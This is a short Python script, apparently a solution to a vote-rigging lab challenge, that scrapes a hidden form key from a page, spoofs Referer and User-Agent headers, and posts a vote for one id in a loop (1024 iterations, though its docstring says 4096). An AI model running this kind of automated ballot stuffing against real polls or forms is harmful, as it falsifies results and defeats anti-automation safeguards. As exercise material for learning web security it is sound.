#!/usr/bin/python3.8
#Author Hileamlak M. Yitayew

"""this module will be used for voting 4096 times
at the website provided"""
import requests
import time
from bs4 import BeautifulSoup

payload = {'id': '68'}
url = "http://158.69.76.135/level2.php"
headers = {'Referer': url,'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36'}

i = 0
while i < 1024:
    session = requests.session()

    site = session.get(url)
    parsed_site = BeautifulSoup(site.content, 'html.parser')

    #find the the input tag that has the hidden type and get its value
    value = parsed_site.find('input',{'name':'key'}).get('value')

    payload['key'] = value
    payload['holdthedoor']='submit'

    r = session.post(url, data=payload, headers=headers)
    if r.status_code == 200:
        i += 1
        print("Votes casted {}".format(i))
    else:
        time.sleep(1)
    del session
